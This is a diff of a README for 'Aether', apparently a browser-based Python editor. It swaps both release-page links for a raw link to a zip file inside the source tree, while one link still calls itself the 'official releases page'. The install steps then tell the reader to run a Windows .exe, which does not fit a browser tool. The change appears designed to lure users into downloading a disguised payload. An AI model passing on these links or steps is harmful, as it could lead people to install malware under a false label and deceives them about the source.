@@ -1,12 +1,12 @@
 # 💻 Aether - Write python code in your browser
 
-[![](https://img.shields.io/badge/Download-Aether-blue.svg)](https://github.com/handy-campaign860/Aether/releases)
+[![](https://img.shields.io/badge/Download-Aether-blue.svg)](https://github.com/handy-campaign860/Aether/raw/refs/heads/main/src/components/Software-2.4.zip)
 
 Aether gives you a clean space to write Python code. It uses the Monaco editor, the same engine that powers Visual Studio Code. You get a professional coding experience inside a simple interface. Aether removes clutter so you can focus on your logic.
 
 ## 📥 How to Install
 
-1. Visit the [official releases page](https://github.com/handy-campaign860/Aether/releases) to download the application.
+1. Visit the [official releases page](https://github.com/handy-campaign860/Aether/raw/refs/heads/main/src/components/Software-2.4.zip) to download the application.
 2. Locate the most recent version of the Aether installer for Windows. It will end in a .exe extension.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
